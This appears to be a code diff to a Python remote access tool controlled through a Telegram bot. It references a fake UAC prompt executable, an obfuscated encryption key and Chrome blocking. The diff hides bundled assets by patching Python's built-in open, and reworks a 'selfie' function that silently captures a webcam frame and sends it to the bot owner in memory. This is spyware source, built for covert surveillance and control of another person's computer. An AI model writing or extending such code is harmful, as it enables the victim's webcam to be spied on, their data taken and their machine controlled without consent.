@@ -46,6 +46,7 @@ import ctypes
 import psutil
 import pyngrok
 import inspect
+import builtins
 import functools
 import traceback
 from io import BytesIO
@@ -103,16 +104,21 @@ TELEGRAM_COMMANDS_LIMIT = 100
 TELEGRAM_COMMAND_LENGHT_LIMIT = 32
 TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 KEY_PATH = resource_path("key.key")
+BUNDLE_PATH = [ x for x in listdir(rp_base_path) if x.endswith("Bundle.bin") ] or ""
+if BUNDLE_PATH:
+    BUNDLE_PATH = BUNDLE_PATH[0]
 
 try:
-    vfx = resource_path(join("assets", "vfx"))
-    sfx = resource_path(join("assets", "sfx"))
-    executables = resource_path(join("assets", "executables"))
+    assets_dir = resource_path("assets")
+    vfx = resource_path(join(assets_dir, "vfx"))
+    sfx = resource_path(join(assets_dir, "sfx"))
+    executables = resource_path(join(assets_dir, "executables"))
     fake_uac_prompt_path = join(executables, "fakeuac.exe")
-    keyfile = resource_path("key.key")
-    prototxt_filename = resource_path(join("assets","model","1.prototxt"))
-    caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
-    DLLS_DIR = resource_path(join("assets", "dlls"))
+    keyfile = KEY_PATH
+    bundle_file = BUNDLE_PATH 
+    prototxt_filename = resource_path(join(assets_dir,"model","1.prototxt"))
+    caffemodel_filename = resource_path(join(assets_dir,"model","2.caffemodel"))
+    DLLS_DIR = resource_path(join(assets_dir, "dlls"))
 except Exception as e:
     print(e)
     exit()
@@ -153,6 +159,7 @@ def get_real_key(key_path): #this function MUST stay in the main to remain obfus
     return bytes(key_bytes)
 
 DATA_ENCRYPTION = exists(keyfile)
+ASSETS_PACKED = exists(bundle_file)
 if DATA_ENCRYPTION:
     FERNET_KEY = get_real_key(KEY_PATH)
     print(f"KEY: {FERNET_KEY}")
@@ -160,6 +167,29 @@ if DATA_ENCRYPTION:
         print("FERNET KEY IS NONE")
         sys.exit(1)
     FERNET = SimpleFernet(FERNET_KEY, b"RCPTE")
+
+if ASSETS_PACKED:
+    print(f"Assets bundled, bundle {bundle_file}")
+    BUNDLER = Bundle(bundle_file)
+    print(f"{BUNDLER.index=}")
+    _real_open = builtins.open
+    def patched_open(file, mode="r", *args, **kwargs):
+        print(f"[PatchedOpen] opening {file}")
+        if isinstance(file, str):
+            key = file
+            if key.startswith(assets_dir):
+                key = key[len(assets_dir)+1:]
+            print(f"[PatchedOpen] Key: {key}")
+            if key in BUNDLER.index and "r" in mode:
+                print("[PatchedOpen] Getting content from BUNDLE")
+                data = BUNDLER.get_content(key)
+                if "b" in mode:
+                    return io.BytesIO(data)
+                else:
+                    return io.StringIO(data.decode())
+
+        return _real_open(file, mode, *args, **kwargs)
+    builtins.open = patched_open
 
 if isdir(DLLS_DIR):
     print(f"DLLS Directory exists: {DLLS_DIR}")
@@ -780,13 +810,14 @@ class PeppinoTelegram:
             )
 
     def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
-        return self.send_buttons_input(
+        resp = self.send_buttons_input(
             title=custom_message,
             options={
                 "y":"✅ Yes",
                 "n":"❌ No"
             }
-        ) == "y"
+        )
+        return resp.lower() == "y"
     
     #@requires_admin
     def block_chrome(self, timeout: int) -> None:
@@ -2361,6 +2392,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def restart(self, confirm=True, verbose=True, custom_message: str|None=None) -> None:
         doit = True if not confirm else self.ask_yesno()
+        if not doit:
+            self.operation_canceled()
+            return
         if verbose:
             self.bsendWithHtml("""<b>🔄 Bot Restarting</b>
 
@@ -2637,32 +2671,41 @@ The bot is now restarting. Please wait a moment...
 
     def selfie(self, caption: str | None = None, reply_markup=None) -> bool:
         try:
-            filename = join(BURN_DIRECTORY, randompngname())
             self.opencap()
             ret, frame = self.cap.read()
             if not ret:
                 raise RuntimeError("Webcam read failed")
 
-            imwrite(filename, frame)
-            with open(filename, "rb") as f:
-                resp = self.bot.sendPhoto(
-                    self.owner_id,
-                    f,
-                    caption=caption,
-                    reply_markup=reply_markup,
-                    parse_mode="HTML"
-                )
-                self.all_session_messages.append(resp["message_id"])
+            success, buffer = imencode(".jpg", frame)
+            if not success:
+                raise RuntimeError("Failed to encode frame to JPEG")
 
-            remove(filename)
+            photo_buf = craft_file(
+                content=buffer.tobytes(),
+                filename="selfie.jpg"          # or randompngname()
+            )
+
+            resp = self.bot.sendPhoto(
+                chat_id=self.owner_id,
+                photo=photo_buf,
+                caption=caption,
+                reply_markup=reply_markup,
+                parse_mode="HTML",
+            )
+            self.all_session_messages.append(resp["message_id"])
             self.closecap()
             return True
 
         except Exception as e:
-            self.bsendWithHtml(
-                f"Error while taking selfie\n<pre>{html.escape(str(e))}</pre>"
-            )
+            print(f"Selfie failed: {e}")
+            self.closecap()
             return False
+        finally:
+            if hasattr(self, 'cap') and self.cap is not None:
+                try:
+                    self.closecap()
+                except:
+                    pass
 
     def send_status(self) -> None:
         lines = ["<b>📋 self.user Overview</b>\n"]
